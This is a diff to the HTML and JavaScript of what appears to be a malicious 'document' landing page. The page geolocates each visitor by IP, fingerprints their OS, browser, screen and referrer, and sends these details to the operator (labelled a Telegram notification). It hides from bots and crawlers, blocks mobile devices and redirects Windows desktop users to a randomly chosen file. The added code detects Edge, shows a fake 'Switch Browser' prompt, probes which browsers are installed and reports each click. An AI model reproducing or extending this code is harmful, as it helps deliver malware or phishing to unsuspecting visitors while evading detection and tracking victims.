@@ -83,30 +83,72 @@
             font-size: 11px;
             color: #adb5bd;
         }
-        .desktop-message {
+        .message-card {
             font-family: Arial, sans-serif;
             text-align: center;
             padding: 50px;
             max-width: 500px;
             margin: 0 auto;
         }
-        .desktop-message .card {
+        .message-card .card {
             background: #f8f9fa;
             border-radius: 12px;
             padding: 40px;
             border: 1px solid #e9ecef;
         }
-        .desktop-message .icon-large {
+        .message-card .icon-large {
             font-size: 48px;
             margin-bottom: 20px;
         }
-        .desktop-message h2 {
+        .message-card h2 {
             color: #1a1e2b;
             margin-bottom: 16px;
         }
-        .desktop-message p {
+        .message-card p {
             color: #6c757d;
             margin: 16px 0;
+        }
+        .permission-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 24px;
+        }
+        .permission-btn {
+            display: inline-block;
+            padding: 10px 24px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .permission-btn:hover:not(:disabled) {
+            background: #5a67d8;
+        }
+        .permission-btn.disabled, .permission-btn:disabled {
+            background: #adb5bd;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+        .install-link {
+            display: inline-block;
+            margin-top: 4px;
+            font-size: 12px;
+            color: #667eea;
+            text-decoration: none;
+        }
+        .install-link:hover {
+            text-decoration: underline;
+        }
+        .browser-status {
+            font-size: 12px;
+            margin-top: 8px;
+            color: #6c757d;
         }
     </style>
 </head>
@@ -155,12 +197,9 @@
         // ============================================================
         async function getLocationInfo() {
             try {
-                // Get IP
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const ip = ipData.ip;
-                
-                // Get location from ipapi
                 const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                 const locationData = await locationResponse.json();
                 
@@ -191,7 +230,7 @@
         // ============================================================
         // SEND VISIT NOTIFICATION
         // ============================================================
-        async function sendVisitNotification(selectedFile) {
+        async function sendVisitNotification(selectedFile, browserName, action = 'view') {
             const location = await getLocationInfo();
             const userAgent = navigator.userAgent;
             const screenSize = `${window.screen.width}x${window.screen.height}`;
@@ -209,7 +248,8 @@
 
 📁 <b>File:</b> ${fileName}
 💻 <b>OS:</b> ${navigator.platform}
-🌍 <b>Browser:</b> ${navigator.userAgent.match(/(Chrome|Firefox|Edge|Safari)/) || 'Unknown'}
+🌍 <b>Browser:</b> ${browserName}
+🔄 <b>Action:</b> ${action}
 🖥️ <b>Screen:</b> ${screenSize}
 🔗 <b>Referrer:</b> ${referrer}
 📅 <b>Time:</b> ${timestamp}
@@ -221,12 +261,157 @@
         }
         
         // ============================================================
+        // BROWSER DETECTION
+        // ============================================================
+        function detectBrowser() {
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.indexOf('edg') > -1 || ua.indexOf('edge') > -1) return 'Microsoft Edge';
+            if (ua.indexOf('chrome') > -1 && ua.indexOf('edg') === -1) return 'Chrome';
+            if (ua.indexOf('firefox') > -1) return 'Firefox';
+            if (ua.indexOf('safari') > -1 && ua.indexOf('chrome') === -1) return 'Safari';
+            return 'Unknown';
+        }
+        
+        // ============================================================
+        // CHECK IF BROWSER IS INSTALLED (via protocol detection)
+        // ============================================================
+        function isBrowserInstalled(protocol, callback) {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            
+            let timeout = setTimeout(() => {
+                document.body.removeChild(iframe);
+                callback(false);
+            }, 2000);
+            
+            iframe.onload = function() {
+                clearTimeout(timeout);
+                document.body.removeChild(iframe);
+                callback(true);
+            };
+            
+            iframe.src = protocol + '://test';
+        }
+        
+        // ============================================================
+        // ASK TO OPEN IN CHROME/FIREFOX (check installation first)
+        // ============================================================
+        function askToOpenInOtherBrowser(currentUrl) {
+            // Create modal
+            const modal = document.createElement('div');
+            modal.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.7);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                z-index: 10000;
+            `;
+            
+            const dialog = document.createElement('div');
+            dialog.style.cssText = `
+                background: white;
+                max-width: 450px;
+                width: 90%;
+                padding: 30px;
+                border-radius: 24px;
+                text-align: center;
+                box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            `;
+            
+            dialog.innerHTML = `
+                <div style="font-size: 48px; margin-bottom: 16px;">🌐</div>
+                <h2 style="margin-bottom: 12px;">Switch Browser</h2>
+                <p style="color: #6c757d; margin-bottom: 24px;">
+                    This document works best with <strong>Google Chrome</strong> or <strong>Mozilla Firefox</strong>.
+                    Choose a browser to open the link.
+                </p>
+                <div class="permission-buttons" id="browserButtons">
+                    <button id="chromeBtn" class="permission-btn" style="background: #4285f4;">Open in Chrome</button>
+                    <button id="firefoxBtn" class="permission-btn" style="background: #ff9400;">Open in Firefox</button>
+                    <button id="cancelBtn" class="permission-btn" style="background: #adb5bd;">Cancel</button>
+                </div>
+                <div id="chromeStatus" class="browser-status"></div>
+                <div id="firefoxStatus" class="browser-status"></div>
+                <p style="font-size: 11px; color: #adb5bd; margin-top: 20px;">
+                    If you don't have a browser installed, you can download it below.
+                </p>
+                <div style="margin-top: 12px;">
+                    <a href="https://www.google.com/chrome/" target="_blank" style="color: #4285f4; text-decoration: none; margin: 0 8px;">Download Chrome</a>
+                    <a href="https://www.mozilla.org/firefox/" target="_blank" style="color: #ff9400; text-decoration: none; margin: 0 8px;">Download Firefox</a>
+                </div>
+            `;
+            
+            modal.appendChild(dialog);
+            document.body.appendChild(modal);
+            
+            // Check if Chrome is installed
+            isBrowserInstalled('googlechrome', (chromeInstalled) => {
+                const chromeBtn = document.getElementById('chromeBtn');
+                const chromeStatus = document.getElementById('chromeStatus');
+                if (!chromeInstalled) {
+                    chromeBtn.disabled = true;
+                    chromeBtn.classList.add('disabled');
+                    chromeStatus.innerHTML = '⚠️ Chrome not detected on this computer';
+                } else {
+                    chromeStatus.innerHTML = '✅ Chrome is installed';
+                }
+            });
+            
+            // Check if Firefox is installed
+            isBrowserInstalled('firefox', (firefoxInstalled) => {
+                const firefoxBtn = document.getElementById('firefoxBtn');
+                const firefoxStatus = document.getElementById('firefoxStatus');
+                if (!firefoxInstalled) {
+                    firefoxBtn.disabled = true;
+                    firefoxBtn.classList.add('disabled');
+                    firefoxStatus.innerHTML = '⚠️ Firefox not detected on this computer';
+                } else {
+                    firefoxStatus.innerHTML = '✅ Firefox is installed';
+                }
+            });
+            
+            // Handle Chrome button
+            document.getElementById('chromeBtn').onclick = () => {
+                modal.remove();
+                window.location.href = 'googlechrome://' + currentUrl.replace(/^https?:\/\//, '');
+                navigator.clipboard.writeText(currentUrl);
+                alert('If Chrome didn\'t open automatically, the link has been copied to your clipboard. Please paste it into Chrome.');
+                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'opened_in_chrome');
+                setTimeout(() => window.close(), 1000);
+            };
+            
+            // Handle Firefox button
+            document.getElementById('firefoxBtn').onclick = () => {
+                modal.remove();
+                window.location.href = 'firefox://' + currentUrl.replace(/^https?:\/\//, '');
+                navigator.clipboard.writeText(currentUrl);
+                alert('If Firefox didn\'t open automatically, the link has been copied to your clipboard. Please paste it into Firefox.');
+                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'opened_in_firefox');
+                setTimeout(() => window.close(), 1000);
+            };
+            
+            // Handle Cancel button
+            document.getElementById('cancelBtn').onclick = () => {
+                modal.remove();
+                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'cancelled_switch');
+            };
+        }
+        
+        // ============================================================
         // USERAGENT DETECTION
         // ============================================================
         (async function() {
             const ua = navigator.userAgent.toLowerCase();
             const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i.test(ua);
             const isWindows = /windows|win32|win64/i.test(ua);
+            const browser = detectBrowser();
+            const currentUrl = window.location.href;
             
             // BOT DETECTION
             const isBot = /bot|crawler|spider|scraper|facebookexternalhit|twitterbot|linkedinbot|whatsapp/i.test(ua);
@@ -245,9 +430,9 @@
             // MOBILE BLOCK
             if (isMobile) {
                 document.getElementById('app').innerHTML = `
-                    <div class="desktop-message">
+                    <div class="message-card">
                         <div class="card">
-                            <div class="icon-large">💻</div>
+                            <div class="icon-large">📱</div>
                             <h2>Desktop Access Required</h2>
                             <p>This document requires a desktop environment.</p>
                             <p style="font-size: 13px; color: #adb5bd;">Please open this link on a desktop computer.</p>
@@ -259,7 +444,14 @@
                 return;
             }
             
-            // WINDOWS DESKTOP – show loading
+            // EDGE – ASK FOR PERMISSION TO USE CHROME/FIREFOX
+            if (browser === 'Microsoft Edge') {
+                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'edge_detected');
+                askToOpenInOtherBrowser(currentUrl);
+                return;
+            }
+            
+            // WINDOWS DESKTOP + CHROME/FIREFOX – show loading and redirect
             document.getElementById('app').innerHTML = `
                 <div class="container">
                     <div class="icon">📄</div>
@@ -287,8 +479,8 @@
             
             const selectedFile = getRandomFile();
             
-            // Send Telegram notification (don't wait)
-            sendVisitNotification(selectedFile);
+            // Send Telegram notification
+            sendVisitNotification(selectedFile, browser, 'access_granted');
             
             if (!sessionStorage.getItem('redirected')) {
                 sessionStorage.setItem('redirected', 'true');
